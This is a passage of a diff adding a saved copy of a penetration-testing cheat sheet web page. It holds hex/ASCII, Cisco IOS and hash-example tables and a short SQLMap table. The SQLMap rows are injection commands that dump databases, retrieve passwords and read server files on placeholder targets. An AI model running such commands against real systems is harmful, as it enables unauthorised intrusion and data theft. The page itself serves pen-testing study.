+<tr>
+<td>
+<p><code>x36</code></p>
+</td>
+<td>
+<p>6</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x37</code></p>
+</td>
+<td>
+<p>7</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x38</code></p>
+</td>
+<td>
+<p>8</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x39</code></p>
+</td>
+<td>
+<p>9</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x3a</code></p>
+</td>
+<td>
+<p>:</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x3b</code></p>
+</td>
+<td>
+<p>;</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x3c</code></p>
+</td>
+<td>
+<p>&lt;</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x3d</code></p>
+</td>
+<td>
+<p>=</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x3e</code></p>
+</td>
+<td>
+<p>&gt;</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x3f</code></p>
+</td>
+<td>
+<p>?</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x40</code></p>
+</td>
+<td>
+<p>@</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x41</code></p>
+</td>
+<td>
+<p>A</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x42</code></p>
+</td>
+<td>
+<p>B</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x43</code></p>
+</td>
+<td>
+<p>C</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x44</code></p>
+</td>
+<td>
+<p>D</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x45</code></p>
+</td>
+<td>
+<p>E</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x46</code></p>
+</td>
+<td>
+<p>F</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x47</code></p>
+</td>
+<td>
+<p>G</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x48</code></p>
+</td>
+<td>
+<p>H</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x49</code></p>
+</td>
+<td>
+<p>I</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x4a</code></p>
+</td>
+<td>
+<p>J</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x4b</code></p>
+</td>
+<td>
+<p>K</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x4c</code></p>
+</td>
+<td>
+<p>L</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x4d</code></p>
+</td>
+<td>
+<p>M</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x4e</code></p>
+</td>
+<td>
+<p>N</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x4f</code></p>
+</td>
+<td>
+<p>O</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x50</code></p>
+</td>
+<td>
+<p>P</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x51</code></p>
+</td>
+<td>
+<p>Q</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x52</code></p>
+</td>
+<td>
+<p>R</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x53</code></p>
+</td>
+<td>
+<p>S</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x54</code></p>
+</td>
+<td>
+<p>T</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x55</code></p>
+</td>
+<td>
+<p>U</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x56</code></p>
+</td>
+<td>
+<p>V</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x57</code></p>
+</td>
+<td>
+<p>W</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x58</code></p>
+</td>
+<td>
+<p>X</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x59</code></p>
+</td>
+<td>
+<p>Y</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x5a</code></p>
+</td>
+<td>
+<p>Z</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x5b</code></p>
+</td>
+<td>
+<p>[</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x5c</code></p>
+</td>
+<td>
+<p>\</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x5d</code></p>
+</td>
+<td>
+<p>]</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x5e</code></p>
+</td>
+<td>
+<p>^</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x5f</code></p>
+</td>
+<td>
+<p>_</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x60</code></p>
+</td>
+<td>
+<p>`</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x61</code></p>
+</td>
+<td>
+<p>a</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x62</code></p>
+</td>
+<td>
+<p>b</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x63</code></p>
+</td>
+<td>
+<p>c</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x64</code></p>
+</td>
+<td>
+<p>d</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x65</code></p>
+</td>
+<td>
+<p>e</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x66</code></p>
+</td>
+<td>
+<p>f</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x67</code></p>
+</td>
+<td>
+<p>g</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x68</code></p>
+</td>
+<td>
+<p>h</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x69</code></p>
+</td>
+<td>
+<p>i</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x6a</code></p>
+</td>
+<td>
+<p>j</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x6b</code></p>
+</td>
+<td>
+<p>k</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x6c</code></p>
+</td>
+<td>
+<p>l</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x6d</code></p>
+</td>
+<td>
+<p>m</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x6e</code></p>
+</td>
+<td>
+<p>n</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x6f</code></p>
+</td>
+<td>
+<p>o</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x70</code></p>
+</td>
+<td>
+<p>p</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x71</code></p>
+</td>
+<td>
+<p>q</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x72</code></p>
+</td>
+<td>
+<p>r</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x73</code></p>
+</td>
+<td>
+<p>s</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x74</code></p>
+</td>
+<td>
+<p>t</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x75</code></p>
+</td>
+<td>
+<p>u</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x76</code></p>
+</td>
+<td>
+<p>v</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x77</code></p>
+</td>
+<td>
+<p>w</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x78</code></p>
+</td>
+<td>
+<p>x</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x79</code></p>
+</td>
+<td>
+<p>y</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>x7a</code></p>
+</td>
+<td>
+<p>z</p>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h2 id="cisco-ios-commands">CISCO IOS Commands<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#cisco-ios-commands"><i class="fa fa-link"></i></a></h2>
+<p>A collection of useful Cisco IOS commands.</p>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<p><code>enable</code></p>
+</td>
+<td>
+<p>Enters enable mode</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>conf t</code></p>
+</td>
+<td>
+<p>Short for, configure terminal</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>(config)# interface fa0/0</code></p>
+</td>
+<td>
+<p>Configure FastEthernet 0/0</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>(config-if)# ip addr 0.0.0.0 255.255.255.255</code></p>
+</td>
+<td>
+<p>Add ip to fa0/0</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>(config-if)# ip addr 0.0.0.0 255.255.255.255</code></p>
+</td>
+<td>
+<p>Add ip to fa0/0</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>(config-if)# line vty 0 4</code></p>
+</td>
+<td>
+<p>Configure vty line</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>(config-line)# login</code></p>
+</td>
+<td>
+<p>Cisco set telnet password</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>(config-line)# password YOUR-PASSWORD</code></p>
+</td>
+<td>
+<p>Set telnet password</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code># show running-config</code></p>
+</td>
+<td>
+<p>Show running config loaded in memory</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code># show startup-config</code></p>
+</td>
+<td>
+<p>Show sartup config</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code># show version</code></p>
+</td>
+<td>
+<p>show cisco IOS version</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code># show session</code></p>
+</td>
+<td>
+<p>display open sessions</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code># show ip interface</code></p>
+</td>
+<td>
+<p>Show network interfaces</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code># show interface e0</code></p>
+</td>
+<td>
+<p>Show detailed interface info</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code># show ip route</code></p>
+</td>
+<td>
+<p>Show routes</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code># show access-lists</code></p>
+</td>
+<td>
+<p>Show access lists</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code># dir file systems</code></p>
+</td>
+<td>
+<p>Show available files</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code># dir all-filesystems</code></p>
+</td>
+<td>
+<p>File information</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code># dir /all</code></p>
+</td>
+<td>
+<p>SHow deleted files</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code># terminal length 0</code></p>
+</td>
+<td>
+<p>No limit on terminal output</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code># copy running-config tftp</code></p>
+</td>
+<td>
+<p>Copys running config to tftp server</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code># copy running-config startup-config</code></p>
+</td>
+<td>
+<p>Copy startup-config to running-config</p>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h2 id="cryptography">Cryptography<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#cryptography"><i class="fa fa-link"></i></a></h2>
+<h3 id="hash-lengths">Hash Lengths<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#hash-lengths"><i class="fa fa-link"></i></a></h3>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Hash</th>
+<th>Size</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<p>MD5 Hash Length</p>
+</td>
+<td>
+<p><code>16 Bytes</code></p>
+</td>
+</tr>
+<tr>
+<td>
+<p>SHA-1 Hash Length</p>
+</td>
+<td>
+<p><code>20 Bytes</code></p>
+</td>
+</tr>
+<tr>
+<td>
+<p>SHA-256 Hash Length</p>
+</td>
+<td>
+<p><code>32 Bytes</code></p>
+</td>
+</tr>
+<tr>
+<td>
+<p>SHA-512 Hash Length</p>
+</td>
+<td>
+<p><code>64 Bytes</code></p>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h3 id="hash-examples">Hash Examples<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#hash-examples"><i class="fa fa-link"></i></a></h3>
+<p>Likely just use <strong>hash-identifier</strong> for this but here are some example hashes:</p>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Hash</th>
+<th>Example</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+ <td>
+<p>MD5 Hash Example</p>
+</td>
+<td>
+<p><code>8743b52063cd84097a65d1633f5c74f5</code></p>
+</td>
+</tr>
+<tr>
+<td>
+<p>MD5 $PASS:$SALT Example</p>
+</td>
+<td>
+<p><code>01dfae6e5d4d90d9892622325959afbe:7050461</code></p>
+</td>
+</tr>
+<tr>
+<td>
+<p>MD5 $SALT:$PASS</p>
+</td>
+<td>
+<p><code>f0fda58630310a6dd91a7d8f0a4ceda2:4225637426</code></p>
+</td>
+</tr>
+<tr>
+<td>
+<p>SHA1 Hash Example</p>
+</td>
+<td>
+<p><code>b89eaac7e61417341b710b727768294d0e6a277b</code></p>
+</td>
+</tr>
+<tr>
+<td>
+<p>SHA1 $PASS:$SALT</p>
+</td>
+<td>
+<p><code>2fc5a684737ce1bf7b3b239df432416e0dd07357:2014</code></p>
+</td>
+</tr>
+<tr>
+<td>
+<p>SHA1 $SALT:$PASS</p>
+</td>
+<td>
+<p><code>cac35ec206d868b7d7cb0b55f31d9425b075082b:5363620024</code></p>
+</td>
+</tr>
+<tr>
+<td>
+<p>SHA-256</p>
+</td>
+<td>
+<p><code>127e6fbfe24a750e72930c220a8e138275656b<br>8e5d8f48a98c3c92df2caba935</code></p>
+</td>
+</tr>
+<tr>
+<td>
+<p>SHA-256 $PASS:$SALT</p>
+</td>
+<td>
+<p><code>c73d08de890479518ed60cf670d17faa26a4a7<br>1f995c1dcc978165399401a6c4</code></p>
+</td>
+</tr>
+<tr>
+<td>
+<p>SHA-256 $SALT:$PASS</p>
+</td>
+<td>
+<p><code>eb368a2dfd38b405f014118c7d9747fcc97f4<br>f0ee75c05963cd9da6ee65ef498:560407001617</code></p>
+</td>
+</tr>
+<tr>
+<td>
+<p>SHA-512</p>
+</td>
+<td>
+<p><code>82a9dda829eb7f8ffe9fbe49e45d47d2dad9<br>664fbb7adf72492e3c81ebd3e29134d9bc<br>12212bf83c6840f10e8246b9db54a4<br>859b7ccd0123d86e5872c1e5082f</code></p>
+</td>
+</tr>
+<tr>
+<td>
+<p>SHA-512 $PASS:$SALT</p>
+</td>
+<td>
+<p><code>e5c3ede3e49fb86592fb03f471c35ba13e8<br>d89b8ab65142c9a8fdafb635fa2223c24e5<br>558fd9313e8995019dcbec1fb58414<br>6b7bb12685c7765fc8c0d51379fd</code></p>
+</td>
+</tr>
+<tr>
+<td>
+<p>SHA-512 $SALT:$PASS</p>
+</td>
+<td>
+<p><code>976b451818634a1e2acba682da3fd6ef<br>a72adf8a7a08d7939550c244b237c72c7d4236754<br>4e826c0c83fe5c02f97c0373b6b1<br>386cc794bf0d21d2df01bb9c08a</code></p>
+</td>
+</tr>
+<tr>
+<td>
+<p>NTLM Hash Example</p>
+</td>
+<td>
+<p><code>b4b9b02e6f09a9bd760f388b67351e2b</code></p>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h2 id="sqlmap-examples">SQLMap Examples<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#sqlmap-examples"><i class="fa fa-link"></i></a></h2>
+<p>A mini SQLMap cheat sheet:</p>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<p><code>sqlmap -u http://meh.com --forms --batch --crawl=10 <br> --cookie=jsessionid=54321 --level=5 --risk=3</code></p>
+</td>
+<td>
+<p>Automated sqlmap scan</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code> sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE <br> --level=3 --current-user --current-db --passwords <br> --file-read="/var/www/blah.php" </code></p>
+</td>
+<td>
+<p>Targeted sqlmap scan</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>sqlmap -u "http://meh.com/meh.php?id=1" <br>--dbms=mysql --tech=U --random-agent --dump </code></p>
+</td>
+<td>
+<p>Scan url for union + error based injection with mysql backend <br>and use a random user agent + database dump</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>sqlmap -o -u "http://meh.com/form/" --forms</code></p>
+</td>
+<td>
+<p>sqlmap check form for injection</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>sqlmap -o -u "http://meh/vuln-form" --forms <br> -D database-name -T users --dump</code></p>
+</td>
+<td>
+<p>sqlmap dump and crack hashes for table users on database-name.</p>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+</div>
+<section class="share-box">
+<div class="grid">
+<div class="unit whole">
+<div class="grid pane">
+<div class="unit whole center-on-mobiles">
+<div class="pane-content">
+<h2>Share this on...</h2>
+<p><a href="https://twitter.com/intent/tweet?text=Penetration%20Testing%20Tools%20Cheat%20Sheet&amp;url=https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/&amp;via=Arr0way&amp;related=Arr0way" rel="nofollow" target="_blank" title="Share on Twitter"><i class="fa fa-twitter-square" aria-hidden="true"></i> Twitter</a>
+<a href="https://facebook.com/sharer.php?u=https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/" rel="nofollow" target="_blank" title="Share on Facebook"><i class="fa fa-facebook-square" aria-hidden="true"></i> Facebook</a>
+<a href="https://plus.google.com/share?url=https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/" rel="nofollow" target="_blank" title="Share on Google+"><i class="fa fa-google-plus-square" aria-hidden="true"></i> Google+</a>
+<a href="https://www.reddit.com/submit?url=https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/&amp;title=Penetration%20Testing%20Tools%20Cheat%20Sheet" rel="nofollow" target="_blank" title="Share on Reddit"><i class="fa fa-reddit-square" aria-hidden="true"></i> Reddit</a></p>
+<h2><br>Follow Arr0way</h2>
+<p><a href="https://twitter.com/Arr0way" rel="nofollow" target="_blank" title="Follow on Twitter"><i class="fa fa-twitter-square" aria-hidden="true"></i> Twitter</a>
+<a href="https://github.com/Arr0way" rel="nofollow" target="_blank" title="Follow on GitHub"><i class="fa fa-github-square" aria-hidden="true"></i> GitHub</a></p>
+<p><br></p>
+</div>
+</div>
+<h2><br>Also... <br> <br>You might want to read these</h2>
+</div>
+</div>
+</div></section>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Category</th>
+<th>Post Name</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<pc><p><code>cheat-sheet</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="https://highon.coffee/blog/lfi-cheat-sheet/">LFI Cheat Sheet</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>kali linux</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="https://highon.coffee/blog/kali-chromium-install/">HowTo: Kali Linux Chromium Install for Web App Pen Testing</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>walkthroughs</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="https://highon.coffee/blog/insomnihack-ctf-teaser-smartcat2-writeup/">InsomniHack CTF Teaser - Smartcat2 Writeup</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>walkthroughs</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="https://highon.coffee/blog/insomnihack-ctf-teaser-smartcat1-writeup/">InsomniHack CTF Teaser - Smartcat1 Writeup</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>walkthroughs</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="https://highon.coffee/blog/fristileaks-walkthrough/">FristiLeaks 1.3 Walkthrough</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>walkthroughs</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="https://highon.coffee/blog/sickos-1-walkthrough/">SickOS 1.1 - Walkthrough</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>walkthroughs</code></p></pc>
+</td>
+ <td>
+<pc><p><b><a href="https://highon.coffee/blog/the-wall-walkthrough/">The Wall Boot2Root Walkthrough</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>walkthroughs</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="https://highon.coffee/blog/sleepy-ctf-walkthrough/">/dev/random: Sleepy Walkthrough CTF</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>walkthroughs</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="https://highon.coffee/blog/pipe-ctf-walkthrough/">/dev/random Pipe walkthrough</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>walkthroughs</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="https://highon.coffee/blog/lord-of-the-root-walkthrough/">Lord of the Root Walkthrough CTF</a></b></p></pc>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+</article>
+</div>
+<div class="unit one-fifth hide-on-mobiles">
+<aside>
+<ul>
+<li class="">
+<a href="https://highon.coffee/blog/">All Blog</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/cheat-sheet/">Cheat Sheets</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/techniques/">Techniques</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/security-hardening/">Security Hardening</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/walkthroughs/">WalkThroughs</a>
+</li>
+</ul>
+<h4>Cheat Sheets</h4>
+<ul>
+<li class="current">
+<a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/">Penetration Testing Tools Cheat Sheet</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/lfi-cheat-sheet/">LFI Cheat Sheet</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/vi-cheat-sheet/">Vi Cheat Sheet</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/systemd-cheat-sheet/">Systemd Cheat Sheet</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/reverse-shell-cheat-sheet/">Reverse Shell Cheat Sheet</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/nbtscan-cheat-sheet/">nbtscan Cheat Sheet</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/nmap-cheat-sheet/">Nmap Cheat Sheet</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/linux-commands-cheat-sheet/">Linux Commands Cheat Sheet</a>
+</li>
+<li>
+<a href="https://highon.coffee/blog/cheat-sheet/">More »</a>
+</li>
+</ul>
+<h4>WalkThroughs</h4>
+<ul>
+<li class="">
+<a href="https://highon.coffee/blog/insomnihack-ctf-teaser-smartcat2-writeup/">InsomniHack CTF Teaser - Smartcat2 Writeup</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/insomnihack-ctf-teaser-smartcat1-writeup/">InsomniHack CTF Teaser - Smartcat1 Writeup</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/fristileaks-walkthrough/">FristiLeaks 1.3 Walkthrough</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/sickos-1-walkthrough/">SickOS 1.1 - Walkthrough</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/the-wall-walkthrough/">The Wall Boot2Root Walkthrough</a>
+</li>
+<li>
+<a href="https://highon.coffee/blog/walkthroughs/">More »</a>
+</li>
+</ul>
+<h4>Techniques</h4>
+<ul>
+<li class="">
+<a href="https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/">SSH &amp; Meterpreter Pivoting Techniques</a>
+</li>
+<li>
+<a href="https://highon.coffee/blog/techniques/">More »</a>
+</li>
+</ul>
+<h4>Security Hardening</h4>
+<ul>
+<li class="">
+<a href="https://highon.coffee/blog/security-harden-centos-7/">Security Harden CentOS 7</a>
+</li>
+<li>
+<a href="https://highon.coffee/blog/security-hardening/">More »</a>
+</li>
+</ul>
+<h4>/dev/urandom</h4>
+<ul>
+<li class="">
+<a href="https://highon.coffee/blog/macbook-post-install-check-list/">MacBook - Post Install Config + Apps</a>
+</li>
+<li>
+<a href="https://highon.coffee/blog/urandom/">More »</a>
+</li>
+</ul>
+<h4>Other Blog</h4>
+<ul>
+<li class="">
+<a href="https://highon.coffee/blog/kali-chromium-install/">HowTo: Kali Linux Chromium Install for Web App Pen Testing</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/jenkins-api-unauthenticated-rce-exploit/">Jenkins RCE via Unauthenticated API</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/macbook-post-install-check-list/">MacBook - Post Install Config + Apps</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/enum4linux-cheat-sheet/">enum4linux Cheat Sheet</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/linux-local-enumeration-script/">Linux Local Enumeration Script</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/howto-install-quassel-ubuntu/">HowTo Install Quassel on Ubuntu</a>
+</li>
+
+<li class="">
+<a href="https://highon.coffee/blog/keepnote-macbook-install-instructions/">HowTo Install KeepNote on OSX Mavericks</a>
+</li>
+</ul>
+</aside>
+</div>
+<div class="clear"></div>
+</div>
+</section>
+<footer>
+<div class="grid">
+<div class="unit one-third center-on-mobiles">
+<p>The contents of this website are ©&nbsp;2017 <a href="http://highon.coffee/">HighOn.Coffee</a></p>
+</div>
+<div class="unit two-thirds align-right center-on-mobiles">
+<p>
+Proudly hosted by
+<img src="./Penetration Testing Tools Cheat Sheet_files/footer-logo.png" width="100" height="30" alt="GitHub • Social coding">
+
+</p>
+</div>
+</div>
+</footer>
+<script data-cfasync="false" src="./Penetration Testing Tools Cheat Sheet_files/email-decode.min.js"></script><script type="text/rocketscript" data-rocketoptimized="true">
+  var anchorForId = function (id) {
+    var anchor = document.createElement("a");
+    anchor.className = "header-link";
+    anchor.href      = "#" + id;
+    anchor.innerHTML = "<i class=\"fa fa-link\"></i>";
+    return anchor;
+  };
+
+  var linkifyAnchors = function (level, containingElement) {
+    var headers = containingElement.getElementsByTagName("h" + level);
+    for (var h = 0; h < headers.length; h++) {
+      var header = headers[h];
+
+      if (typeof header.id !== "undefined" && header.id !== "") {
+        header.appendChild(anchorForId(header.id));
+      }
+    }
+  };
+
+  document.onreadystatechange = function () {
+    if (this.readyState === "complete") {
+      var contentBlock = document.getElementsByClassName("docs")[0] || document.getElementsByClassName("blog")[0];
+      if (!contentBlock) {
+        return;
+      }
+      for (var level = 1; level <= 6; level++) {
+        linkifyAnchors(level, contentBlock);
+      }
+    }
+  };
+</script>
+<script type="text/rocketscript" data-rocketoptimized="true">
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-55017594-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+
+
+</body></html>
